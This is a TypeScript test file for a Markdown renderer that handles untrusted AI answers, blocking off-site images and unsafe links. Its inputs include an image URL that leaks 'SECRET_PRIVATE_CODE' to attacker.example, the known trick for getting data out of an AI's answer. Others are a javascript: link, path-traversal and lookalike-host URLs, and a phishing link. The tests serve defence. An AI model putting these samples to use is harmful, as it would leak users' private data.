import { render, screen } from '@testing-library/react'
import userEvent from '@testing-library/user-event'
import { isAllowedImage, Markdown, MarkdownImageSources } from './Markdown'

const REPO_RAW = 'https://raw.githubusercontent.com/acme/shop/'

function renderMd(md: string, props: Partial<Parameters<typeof Markdown>[0]> = {}, sources: string[] = [REPO_RAW]) {
  return render(
    <MarkdownImageSources.Provider value={sources}>
      <Markdown {...props}>{md}</Markdown>
    </MarkdownImageSources.Provider>,
  )
}

describe('Markdown (untrusted, e.g. Claude’s answers)', () => {
  it('never loads a picture from another website: it becomes a link naming the site', () => {
    const { container } = renderMd('Look: ![chart](https://attacker.example/collect?d=SECRET_PRIVATE_CODE)')
    expect(container.querySelector('img')).toBeNull()
    const link = screen.getByRole('link', { name: /picture: chart \(on attacker\.example\)/i })
    expect(link).toHaveAttribute('href', 'https://attacker.example/collect?d=SECRET_PRIVATE_CODE')
    expect(link).toHaveAttribute('target', '_blank')
    expect(link).toHaveAttribute('rel', 'noopener noreferrer')
  })

  it('shows pictures stored in the current repository', () => {
    const { container } = renderMd(`![logo](${REPO_RAW}abc123/docs/logo.png)`)
    const img = container.querySelector('img')
    expect(img).toHaveAttribute('src', `${REPO_RAW}abc123/docs/logo.png`)
    expect(img).toHaveAttribute('referrerpolicy', 'no-referrer')
  })

  it('does not show pictures from another repository, plain http, or tricks that leave the repository', () => {
    const { container } = renderMd(
      [
        '![a](https://raw.githubusercontent.com/evil/repo/main/x.png)',
        '![b](http://raw.githubusercontent.com/acme/shop/main/x.png)',
        '![c](https://raw.githubusercontent.com/acme/shop/../../evil/x.png)',
        '![d](https://raw.githubusercontent.com.evil.example/acme/shop/x.png)',
      ].join('\n\n'),
    )
    expect(container.querySelector('img')).toBeNull()
    expect(screen.getAllByRole('link', { name: /picture/i })).toHaveLength(4)
  })

  it('shows no pictures at all outside a repository', () => {
    const { container } = renderMd(`![logo](${REPO_RAW}main/logo.png)`, {}, [])
    expect(container.querySelector('img')).toBeNull()
  })

  it('opens protocol-relative links in a new tab, as https', () => {
    renderMd('[docs](//phish.example/login)')
    const link = screen.getByRole('link', { name: 'docs' })
    expect(link).toHaveAttribute('href', 'https://phish.example/login')
    expect(link).toHaveAttribute('target', '_blank')
    expect(link).toHaveAttribute('rel', 'noopener noreferrer')
  })

  it('turns relative links into file buttons (known files) or plain text, never navigating the app away', async () => {
    const user = userEvent.setup()
    const onCodeClick = vi.fn(() => true)
    renderMd('See [the app](./src/app.py#L3), [a missing file](src/nope.py) and [an anchor](#/gh/evil/repo).', {
      isCodeLink: (p) => p === 'src/app.py',
      onCodeClick,
    })
    expect(screen.queryAllByRole('link')).toEqual([])
    await user.click(screen.getByRole('button', { name: 'the app' }))
    expect(onCodeClick).toHaveBeenCalledWith('src/app.py')
    expect(screen.getByText('a missing file').tagName).toBe('SPAN')
    expect(screen.getByText('an anchor').tagName).toBe('SPAN')
  })

  it('drops script and data links', () => {
    renderMd('[x](javascript:alert(1)) [y](data:text/html,hi) [z](mailto:a@b.c)')
    expect(screen.queryAllByRole('link')).toEqual([])
  })

  it('keeps a blocked picture inside a link as plain text (no link inside a link)', () => {
    const { container } = renderMd('[![badge](https://img.example/b.svg)](https://example.com/)')
    expect(container.querySelectorAll('a')).toHaveLength(1)
    expect(container.querySelector('a')).toHaveTextContent('Picture: badge (on img.example)')
  })

  it('still turns file names in code into buttons', async () => {
    const user = userEvent.setup()
    const onCodeClick = vi.fn(() => true)
    renderMd('It starts in `src/main.tsx`.', { isCodeLink: (c) => c === 'src/main.tsx', onCodeClick })
    await user.click(screen.getByRole('button', { name: 'src/main.tsx' }))
    expect(onCodeClick).toHaveBeenCalledWith('src/main.tsx')
  })
})

describe('Markdown (trusted: the project’s own README)', () => {
  it('shows https pictures from anywhere (badges, screenshots)', () => {
    const { container } = renderMd('![build](https://img.shields.io/badge/build-passing-green)', { trusted: true }, [])
    expect(container.querySelector('img')).toHaveAttribute('src', 'https://img.shields.io/badge/build-passing-green')
  })

  it('shows plain-http pictures as links instead', () => {
    const { container } = renderMd('![old](http://example.com/a.png)', { trusted: true })
    expect(container.querySelector('img')).toBeNull()
    expect(screen.getByRole('link', { name: /picture: old \(on example\.com\)/i })).toBeInTheDocument()
  })

  it('resolves relative links and pictures with resolveUrl, and opens websites in a new tab', () => {
    const resolveUrl = (url: string, kind: 'link' | 'image') => (kind === 'image' ? `${REPO_RAW}main/${url}` : `https://github.com/acme/shop/blob/main/${url}`)
    const { container } = renderMd('![shot](docs/shot.png) [guide](docs/guide.md) [site](//acme.example)', { trusted: true, resolveUrl })
    expect(container.querySelector('img')).toHaveAttribute('src', `${REPO_RAW}main/docs/shot.png`)
    expect(screen.getByRole('link', { name: 'guide' })).toHaveAttribute('href', 'https://github.com/acme/shop/blob/main/docs/guide.md')
    expect(screen.getByRole('link', { name: 'site' })).toHaveAttribute('target', '_blank')
  })
})

describe('isAllowedImage', () => {
  it('compares normalised URLs against prefixes that end in a slash', () => {
    expect(isAllowedImage(`${REPO_RAW}main/a.png`, [REPO_RAW])).toBe(true)
    expect(isAllowedImage('https://RAW.githubusercontent.com/Acme/Shop/main/a.png', [REPO_RAW])).toBe(true)
    expect(isAllowedImage('https://raw.githubusercontent.com/acme/shop-evil/a.png', [REPO_RAW])).toBe(false)
    expect(isAllowedImage(`${REPO_RAW}main/a.png`, ['https://raw.githubusercontent.com/acme/shop'])).toBe(false)
    expect(isAllowedImage('not a url', [REPO_RAW])).toBe(false)
  })
})
